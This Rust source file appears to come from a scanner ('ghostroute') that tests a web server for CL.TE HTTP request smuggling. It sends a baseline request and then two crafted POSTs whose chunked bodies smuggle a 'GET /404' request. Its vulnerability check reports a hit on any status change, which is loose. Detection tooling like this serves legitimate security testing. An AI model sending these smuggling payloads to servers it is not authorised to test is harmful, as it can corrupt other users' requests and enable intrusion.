use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;
use tokio::time::timeout;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;
    let timeout_dur = cfg.timeout;

    // Step 1: Baseline — send a normal request, note response
    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;
    let baseline_len = baseline.body.len();

    // Step 2: CL.TE probe
    // Frontend uses Content-Length (ignores Transfer-Encoding)
    // Backend uses Transfer-Encoding (ignores Content-Length)
    // Attack: send CL that covers entire body, but TE terminates early.
    // The trailing data is treated as the next request on the backend.
    //
    // Body: "0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X" (35 bytes)
    // - CL = 35 → frontend sends all 35 bytes to backend
    // - Backend reads chunked body: "0\r\n\r\n" (5 bytes) → POST done
    // - Remaining 30 bytes: "GET /404 HTTP/1.1\r\nX-Ignore: X"
    // - Backend treats this as start of next request (missing final \r\n)
    // - Next client request provides the missing terminator + its own request
    // - Backend processes the smuggled GET /404, returns 404
    // Detection: send attack twice on separate connections; second gets 404

    let body = b"0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X";
    let cl = body.len(); // 35

    let build_attack = |a: Option<&AuthStore>| -> Vec<u8> {
        let req_str = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
            host, cl, env!("CARGO_PKG_VERSION")
        );
        let mut bytes = req_str.into_bytes();
        bytes.extend_from_slice(body);
        if let Some(a) = a {
            a.apply_to_request(&mut bytes);
        }
        bytes
    };

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use std::time::Duration;

    // Send first attack POST on connection A
    let attack1 = build_attack(auth);
    let mut conn_a = crate::net::connect(cfg).await?;
    timeout(timeout_dur, conn_a.write_all(&attack1))
        .await.map_err(|_| "Write timeout on attack 1")?
        .map_err(|e| format!("Write error on attack 1: {}", e))?;

    let mut buf_a = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(timeout_dur, conn_a.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf_a.extend_from_slice(&tmp[..n]),
            Ok(Err(e)) => return Err(format!("Read error on attack 1: {}", e)),
            Err(_) => break,
        }
        if buf_a.len() > 1_000_000 { break; }
        if buf_a.windows(4).any(|w| w == b"\r\n\r\n") && buf_a.len() > 100 { break; }
    }
    let _resp1 = h1::parse_response(&buf_a)?;

    // Small delay to let backend settle
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Send second attack POST on a FRESH connection B
    let attack2 = build_attack(auth);
    let mut conn_b = crate::net::connect(cfg).await?;
    timeout(timeout_dur, conn_b.write_all(&attack2))
        .await.map_err(|_| "Write timeout on attack 2")?
        .map_err(|e| format!("Write error on attack 2: {}", e))?;

    let mut buf_b = Vec::with_capacity(4096);
    loop {
        match timeout(timeout_dur, conn_b.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf_b.extend_from_slice(&tmp[..n]),
            Ok(Err(e)) => return Err(format!("Read error on attack 2: {}", e)),
            Err(_) => break,
        }
        if buf_b.len() > 1_000_000 { break; }
        if buf_b.windows(4).any(|w| w == b"\r\n\r\n") && buf_b.len() > 100 { break; }
    }
    let second_resp = h1::parse_response(&buf_b)?;

    // Detection: if the second request gets a 404 (instead of 200),
    // the smuggled GET /404 was processed by the backend.
    let vulnerable = second_resp.status_code == 404
        || second_resp.status_code == 400
        || second_resp.status_code != baseline.status_code;

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);

    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "clte".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second_resp.status_code,
        details: if vulnerable {
            Some(format!(
                "CL.TE confirmed: baseline {} ({}b) vs response {} ({}b)",
                baseline.status_code, baseline_len,
                second_resp.status_code, second_resp.body.len()
            ))
        } else {
            None
        },
        ..Default::default()
    })
}
